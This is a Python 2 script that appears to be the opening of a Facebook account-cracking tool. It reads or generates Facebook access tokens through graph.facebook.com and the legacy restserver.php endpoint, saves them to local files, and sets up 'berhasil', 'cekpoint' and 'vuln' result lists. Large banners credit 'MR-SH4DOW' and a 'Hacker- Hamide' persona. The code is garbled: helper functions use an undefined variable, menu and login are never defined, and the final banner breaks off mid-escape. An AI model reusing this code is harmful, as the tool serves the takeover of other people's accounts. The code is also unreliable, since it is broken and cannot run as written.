#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To MR-SH4DOW
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m[+] Token :")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()

def get(data):
	print '[*] Generate access token '

	try:
		os.mkdir('cookie')
	except OSError:
		pass

	b = open('cookie/token.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)

		b.write(a['access_token'])
		b.close()
		print '[*] successfully generate access token'
		print '[*] Your access token is stored in cookie/token.log'
		menu()
	except KeyError:
		print '[!] Failed to generate access token'
		print '[!] Check your connection / email or password'
		os.remove('cookie/token.log')
		menu()
	except requests.exceptions.ConnectionError:
		print '[!] Failed to generate access token'
		print '[!] Connection error !!!'
		os.remove('cookie/token.log')
		menu()

def phone():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')		

#Dev:MR-SH4DOW-ALONE
##### LOGO #####
logo = """

\033[1;91m ░█████╗░███████╗███████╗██╗░█████╗░██╗░█████╗░██╗░░░░░
\033[1;92m ██╔══██╗██╔════╝██╔════╝██║██╔══██╗██║██╔══██╗██║░░░░░
\033[1;94m ██║░░██║█████╗░░█████╗░░██║██║░░╚═╝██║███████║██║░░░░░
\033[1;97m ██║░░██║██╔══╝░░██╔══╝░░██║██║░░██╗██║██╔══██║██║░░░░░
\033[1;93m ╚█████╔╝██║░░░░░██║░░░░░██║╚█████╔╝██║██║░░██║███████╗
\033[1;95m ░╚════╝░╚═╝░░░░░╚═╝░░░░░╚═╝░╚════╝░╚═╝╚═╝░░╚═╝╚══════╝

\033[1;91m
░█████╗░███████╗███████╗██╗░█████╗░██╗░█████╗░██╗░░░░░
██╔══██╗██╔════╝██╔════╝██║██╔══██╗██║██╔══██╗██║░░░░░
██║░░██║█████╗░░█████╗░░██║██║░░╚═╝██║███████║██║░░░░░
██║░░██║██╔══╝░░██╔══╝░░██║██║░░██╗██║██╔══██║██║░░░░░
 ╚█████╔╝██║░░░░░██║░░░░░██║╚█████╔╝██║██║░░██║███████╗
░╚════╝░╚═╝░░░░░╚═╝░░░░░╚═╝░╚════╝░╚═╝╚═╝░░╚═╝╚══════╝
                                                   

\033[1;91m•───────────────────────────────────────────•
\033[1;97m•-----------------\033[1;37mALI-OFFICAL_AL1\033[1;97m-----------------•
 \033[1;97m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
\033[1;41m\033[1;37m[⚡🔥\033[1;37mAuthor Name: MR-0FIICAL-ALI🔥⚡\033[1;37m]\033[1;0m
\033[1;41m\033[1;37m[⚡🔥\033[1;37m☏ →+0776811468*** 🔥⚡\033[1;37m]\033[1;0m
\033[1;41m\033[1;37m[⚡🔥\033[1;37mYT Channel:Hamroon hamide999🔥⚡\033[1;37m]\033[1;0m
\033[1;41m\033[1;37m[⚡🔥 \033[1;37mFACEBOOK ID: sad star 🔥⚡\033[1;37m]\033[1;0m
\033[1;97m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
\033[1;97m•-----------------\033[1;37mMR-HAROON HAMIDE\033[1;97m-----------------•
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mHacker- Hamide █████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(0.1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;91m
\033[1;92
\033[1;93m
▒█░▒█ █▀▀█ █▀▄▀█ ░▀░ █▀▀▄ █▀▀ 
▒█▀▀█ █▄▄█ █░▀░█ ▀█▀ █░░█ █▀▀ 
▒█░▒█ ▀░░▀ ▀░░░▀ ▀▀▀ ▀▀▀░ ▀▀▀
\033[1;95m──
\033[1;97m•
\03
\033[1;91m────────\033[1;97m───
\033[1;91m──────────────\033[1;9
\033[1;91m───────\033[1;97
\033[1;91m───\033[1;97
\033[1;91m─\033[1;9
\033[1;97m•───────────────────────────────────────────•                                                                                                                             

\033[1;96m ښه راغلاست
\033[1;95m 
 \033[1;97m   
 \033[1;94m  
  \033[1;93m 
 \033[1;92
\033[1;91m


            
